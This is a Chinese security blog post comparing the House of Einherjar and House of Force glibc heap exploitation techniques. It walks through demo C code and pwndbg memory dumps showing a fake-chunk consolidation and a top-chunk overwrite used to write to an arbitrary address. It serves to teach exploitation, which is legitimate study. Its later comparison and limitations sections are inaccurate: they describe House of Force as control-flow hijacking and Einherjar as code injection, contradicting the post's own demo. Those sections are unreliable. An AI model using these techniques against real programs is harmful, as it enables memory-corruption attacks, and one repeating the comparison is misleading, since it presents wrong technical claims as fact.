# House of Einherjar漏洞和House of Force漏洞对比-先知社区

> **来源**: https://xz.aliyun.com/news/17145  
> **文章ID**: 17145

---

# House of Einherjar漏洞和House of Force漏洞对比

## House of Einherjar漏洞

### 漏洞演示

```
int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    printf("Welcome to House of Einherjar!
");
    printf("Tested in Ubuntu 16.04 64bit.
");
    printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
");

    uint8_t* a;
    uint8_t* b;
    uint8_t* d;

    printf("
We allocate 0x38 bytes for 'a'
");
    a = (uint8_t*) malloc(0x38);
    printf("a: %p
", a);

pwndbg> x/20gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000041
0x603010:       0x0000000000000000      0x0000000000000000
0x603020:       0x0000000000000000      0x0000000000000000
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0x0000000000000000      0x0000000000020fc1
0x603050:       0x0000000000000000      0x0000000000000000
//创建chunk A(SIZE=0x38)
打印real_a_size的值为0x38
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38
```

然后构造伪造chunk

```
size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


    printf("Our fake chunk at %p looks like:
", fake_chunk);
    printf("prev_size (not used): %#lx
", fake_chunk[0]);
    printf("size: %#lx
", fake_chunk[1]);
    printf("fwd: %#lx
", fake_chunk[2]);
    printf("bck: %#lx
", fake_chunk[3]);
    printf("fwd_nextsize: %#lx
", fake_chunk[4]);
    printf("bck_nextsize: %#lx
", fake_chunk[5]);

```

输出结果如下:

```
 Our fake chunk at 0x7fffffffe570 looks like:
 prev_size (not used): 0x100
 size: 0x100
 fwd: 0x7fffffffe570
 bck: 0x7fffffffe570
 fwd_nextsize: 0x7fffffffe570
 bck_nextsize: 0x7fffffffe570
 pwndbg> x/20gx 0x7fffffffe570  (fake chunk内存分布)
0x7fffffffe570: 0x0000000000000100      0x0000000000000100
0x7fffffffe580: 0x00007fffffffe570      0x00007fffffffe570
0x7fffffffe590: 0x00007fffffffe570      0x00007fffffffe570
0x7fffffffe5a0: 0x00007fffffffe690      0x0e21f4adde517700
0x7fffffffe5b0: 0x0000000000400ad0      0x00007ffff7a2d840
```

然后申请chunk b(SIZE=0xf8)

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x41

Allocated chunk | PREV_INUSE
Addr: 0x603040
Size: 0x101

Top chunk | PREV_INUSE
Addr: 0x603140
Size: 0x20ec1

pwndbg> x/50gx  0x603000
0x603000:       0x0000000000000000      0x0000000000000041//chunk a
0x603010:       0x0000000000000000      0x0000000000000000
0x603020:       0x0000000000000000      0x0000000000000000
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0x0000000000000000      0x0000000000000101//chunk b
0x603050:       0x0000000000000000      0x0000000000000000
0x603060:       0x0000000000000000      0x0000000000000000
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
0x6030a0:       0x0000000000000000      0x0000000000000000
0x6030b0:       0x0000000000000000      0x0000000000000000
0x6030c0:       0x0000000000000000      0x0000000000000000
0x6030d0:       0x0000000000000000      0x0000000000000000
0x6030e0:       0x0000000000000000      0x0000000000000000
0x6030f0:       0x0000000000000000      0x0000000000000000
0x603100:       0x0000000000000000      0x0000000000000000
0x603110:       0x0000000000000000      0x0000000000000000
0x603120:       0x0000000000000000      0x0000000000000000
0x603130:       0x0000000000000000      0x0000000000000000
0x603140:       0x0000000000000000      0x0000000000020ec1
```

定义一个指向b\_size的指针b\_size\_ptr,打印出来结果分两步

```
初始状态的时候b_size = 0x101     b.size: 0x101
通过 a[real_a_size] = 0; 
这一行代码试图在 a 的分配区域末尾写入一个空字节（0）。这个写入会超出 a 的实际分配大小，从而覆盖 b 的元数据
也就是我们所说的off by null漏洞
此时b_size会被覆盖导致
b_size = 0x100     b.size: 0x100

pwndbg> x/50gx  0x603000
0x603000:       0x0000000000000000      0x0000000000000041
0x603010:       0x0000000000000000      0x0000000000000000
0x603020:       0x0000000000000000      0x0000000000000000
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0x0000000000000000      0x0000000000000100
0x603050:       0x0000000000000000      0x0000000000000000
0x603060:       0x0000000000000000      0x0000000000000000
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
0x6030a0:       0x0000000000000000      0x0000000000000000
```

接下来Write a fake prev\_size to the end of a

```
    // Write a fake prev_size to the end of a
    printf("
We write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk
", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    printf("Our fake prev_size will be %p - %p = %#lx
", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
其实这一步就只做了一件事就是a的presize-fakechunk的地址作为fakesize的大小这样free(b)之后就导致了chunk的合并，将chunk头的地址当做fakechunk的地址
chunk b
pwndbg> x/50gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000041
0x603010:       0x0000000000000000      0x0000000000000000
0x603020:       0x0000000000000000      0x0000000000000000
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0xffff800000604ad0      0x0000000000000100
0x603050:       0x0000000000000000      0x0000000000000000
0x603060:       0x0000000000000000      0x0000000000000000
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
0x6030a0:       0x0000000000000000      0x0000000000000000
0x6030b0:       0x0000000000000000      0x0000000000000000
0x6030c0:       0x0000000000000000      0x0000000000000000
0x6030d0:       0x0000000000000000      0x0000000000000000
fake chunk
pwndbg> x/20gx  0x7fffffffe570
0x7fffffffe570: 0x0000000000000100      0xffff800000604ad0
0x7fffffffe580: 0x00007fffffffe570      0x00007fffffffe570
0x7fffffffe590: 0x00007fffffffe570      0x00007fffffffe570
0x7fffffffe5a0: 0x00007fffffffe690      0xfabd87cb9ed02000
0x7fffffffe5b0: 0x0000000000400ad0      0x00007ffff7a2d840
0xffff800000604ad0 = 0x603050 - 0x00007fffffffe570 
此时释放b
Our fake chunk size is now 0xffff800000625a91 (b.size + fake_prev_size)
此时再次申请malloc一块chunk
malloc(0x200)
我们就会发现触发了合并
pwndbg> x/30gx  0x7fffffffe570
0x7fffffffe570: 0x0000000000000100      0x0000000000000211
0x7fffffffe580: 0x00007fffffffe570      0x00007fffffffe570
0x7fffffffe590: 0x00007fffffffe570      0x00007fffffffe570
0x7fffffffe5a0: 0x00007fffffffe690      0xfabd87cb9ed02000
0x7fffffffe5b0: 0x0000000000400ad0      0x00007ffff7a2d840
```

基本原理就是如此

## House of Force

### 漏洞介绍

通过overwrite topchunk来达到任意地址写的目的

#### 环境展示

```
 we will use this to overwrite a variable at 0x602080.   bss_var
 Its current value is: This is a string that we want to overwrite.   此处的字符串

pwndbg> x/100gx  0x1dad000
0x1dad000:      0x0000000000000000      0x0000000000000111
0x1dad010:      0x0000000000000000      0x0000000000000000
0x1dad020:      0x0000000000000000      0x0000000000000000
0x1dad030:      0x0000000000000000      0x0000000000000000
0x1dad040:      0x0000000000000000      0x0000000000000000
0x1dad050:      0x0000000000000000      0x0000000000000000
0x1dad060:      0x0000000000000000      0x0000000000000000
0x1dad070:      0x0000000000000000      0x0000000000000000
0x1dad080:      0x0000000000000000      0x0000000000000000
0x1dad090:      0x0000000000000000      0x0000000000000000
0x1dad0a0:      0x0000000000000000      0x0000000000000000
0x1dad0b0:      0x0000000000000000      0x0000000000000000
0x1dad0c0:      0x0000000000000000      0x0000000000000000
0x1dad0d0:      0x0000000000000000      0x0000000000000000
0x1dad0e0:      0x0000000000000000      0x0000000000000000
0x1dad0f0:      0x0000000000000000      0x0000000000000000
0x1dad100:      0x0000000000000000      0x0000000000000000
0x1dad110:      0x0000000000000000      0x0000000000020ef1
0x1dad120:      0x0000000000000000      0x0000000000000000
找到topchunk的指针  0x1dad108 ->topchunk
```

### 利用手法

```
此时修改大小为-1
即New size of top chunk 0xffffffffffffffff
pwndbg> x/100gx  0x1dad000
0x1dad000:      0x0000000000000000      0x0000000000000111
0x1dad010:      0x0000000000000000      0x0000000000000000
0x1dad020:      0x0000000000000000      0x0000000000000000
0x1dad030:      0x0000000000000000      0x0000000000000000
0x1dad040:      0x0000000000000000      0x0000000000000000
0x1dad050:      0x0000000000000000      0x0000000000000000
0x1dad060:      0x0000000000000000      0x0000000000000000
0x1dad070:      0x0000000000000000      0x0000000000000000
0x1dad080:      0x0000000000000000      0x0000000000000000
0x1dad090:      0x0000000000000000      0x0000000000000000
0x1dad0a0:      0x0000000000000000      0x0000000000000000
0x1dad0b0:      0x0000000000000000      0x0000000000000000
0x1dad0c0:      0x0000000000000000      0x0000000000000000
0x1dad0d0:      0x0000000000000000      0x0000000000000000
0x1dad0e0:      0x0000000000000000      0x0000000000000000
0x1dad0f0:      0x0000000000000000      0x0000000000000000
0x1dad100:      0x0000000000000000      0x0000000000000000
0x1dad110:      0x0000000000000000      0xffffffffffffffff
0x1dad120:      0x0000000000000000      0x0000000000000000
0x1dad130:      0x0000000000000000      0x0000000000000000
此时我们便可以随意申请任意大小的chunk并且使malloc时不会因为大小不足调用mmap
那么如何做到具体申请到什么地址呢
计算大小公式如下:
     * new_top = old_top + nb
     * nb = new_top - old_top
     * req + 2sizeof(long) = new_top - old_top
     * req = new_top - old_top - 2sizeof(long)
     * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
     * req = dest - old_top - 4*sizeof(long)
结果为unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
此时The value we want to write to at 0x602080, and the top chunk is at 0x1dad110, so accounting for the header size,
we will malloc 0xfffffffffe854f50 bytes.
一旦我们申请这个大小就意味着
As expected, the new pointer is at the same place as the old top chunk: 0x1dad110\
pwndbg> heap

Addr: 0x602000
Size: 0x7f1fa8be2168
pwndbg> x/20gx 0x602000
0x602000:       0x0000000000601e28      0x00007f1fa8be2168   SIZE
0x602010:       0x00007f1fa89d2f10      0x0000000000400536
0x602020 <malloc_usable_size@got.plt>:  0x00007f1fa86760e0      0x00007f1fa8611750
0x602030 <fprintf@got.plt>:     0x00007f1fa8646780      0x00007f1fa8675180
0x602040 <fwrite@got.plt>:      0x00007f1fa865f6f0      0x0000000000000000
0x602050:       0x0000000000000000      0x0000000000000000

在申请100
pwndbg> x/20gx 0x602070
0x602070:       0x0000000000000000      0x0000000000000071
0x602080 <bss_var>:     0x2073692073696854      0x676e697274732061
0x602090 <bss_var+16>:  0x6577207461687420      0x6f7420746e617720
0x6020a0 <bss_var+32>:  0x6972777265766f20      0x00000000002e6574
0x6020b0:       0x0000000000000000      0x0000000000000000
0x6020c0 <stderr@@GLIBC_2.2.5>: 0x00007f1fa89b6540      0x0000000000000000
0x6020d0:       0x0000000000000000      0x0000000000000000
0x6020e0:       0x0000000000000000      0x00000000017ab029
此时便成功控制了

```

## 两种漏洞利用方法对比

首先,我们可以看到HOE修改的是chunk的PREV\_SIZE,而HOF修改的则是chunk的SIZE

1. 概述  
   House of Einherjar 漏洞：  
   主要与内存管理和动态内存分配相关，通常在使用链表或动态数据结构的情况下出现。  
   攻击者利用内存布局和重用漏洞，插入恶意代码或操控内存内容。  
   House of Force 漏洞：  
   主要涉及控制流和函数执行，通常通过操控执行路径或状态变量来实现攻击。  
   攻击者通过强制程序执行特定的操作，达到未授权访问或修改的目的。
2. 漏洞原理  
   House of Einherjar：  
   通过利用内存分配中的漏洞（如内存碎片或重用），攻击者可以在内存中插入特制的数据，这些数据可能包含恶意代码。  
   这种攻击通常涉及对堆的操控和利用特定的内存布局。  
   House of Force：  
   攻击者通过操控程序的控制流，例如利用函数指针或跳转表，强制程序执行不应执行的代码。  
   这种攻击通常依赖于对条件判断的漏洞或不充分的安全检查。
3. 应用场景  
   House of Einherjar：  
   常见于基于 C/C++ 等语言编写的应用程序，尤其是那些使用动态内存分配的程序。  
   攻击者通过构造特定的输入，迫使程序在内存中执行恶意代码。  
   House of Force：  
   通常出现在有控制流漏洞的程序中，例如未正确验证输入或存在逻辑缺陷的应用。  
   攻击者可以通过发送特定的输入，操控程序的执行路径。
4. 防御措施  
   House of Einherjar：  
   使用安全的内存管理方案，避免直接使用不安全的内存分配函数（如 malloc、free）。  
   实施堆保护措施（如堆隔离、堆溢出保护）和内存布局随机化（ASLR）。  
   House of Force：  
   加强输入验证，确保所有输入都经过严格的检查。  
   采用控制流完整性（CFI）技术，确保程序执行不会偏离预期路径。
5. 总结  
   相同点：  
   两者都是通过利用程序中的漏洞来进行攻击，特别是在内存管理和控制流方面。  
   都需要攻击者能够控制输入，以实现非预期的行为。  
   不同点：  
   攻击手段：House of Einherjar 主要依赖于内存操控，而 House of Force 则主要依赖于控制流操控。  
   应用范围：Einherjar 更适合与动态内存管理相关的应用，而 Force 更加关注控制流的逻辑漏洞。

## 两种攻击手法的局限性

1. House of Einherjar 漏洞的局限性  
   依赖于特定的内存布局：  
   攻击成功往往依赖于特定的内存分配和布局情况。如果内存分配随机化（如启用了ASLR），可能会降低攻击的成功率。  
   需要特定的条件：  
   攻击者必须能够控制内存的分配和释放过程，且程序必须存在可利用的内存管理漏洞。  
   环境限制：  
   在某些现代操作系统（如使用堆保护、栈保护等安全机制的系统）上，可靠性较低。  
   复杂性：  
   攻击的实现可能复杂，尤其是在需要精确控制内存状态的情况下。
2. House of Force 漏洞的局限性  
   依赖于逻辑漏洞：  
   攻击需要在程序逻辑中存在明确的漏洞，例如条件检查缺失或错误。如果程序逻辑经过严格审查，攻击难度增加。  
   输入限制：  
   攻击通常依赖于特定的输入格式。如果输入验证得当，攻击可能会被阻止。  
   执行路径的可预测性：  
   攻击者需要对程序的执行路径有较高的了解。对于复杂的程序，这可能并不容易。  
   对抗措施：  
   现代编译器和运行时环境常常包含控制流完整性（CFI）、数据执行保护（DEP）等安全措施，能有效减小此类攻击的成功率。  
   总结  
   House of Einherjar：  
   受限于内存管理的特定条件和环境设置，实施复杂性较高。  
   House of Force：  
   依赖于逻辑漏洞和可预测的输入，现代防护措施能显著降低其有效性。

## 防御手段

(可以通过限制溢出等手段来保护)HOF  
两种漏洞都需要对chunk的申请有需要,最好的防御办法就是限制chunk申请的大小
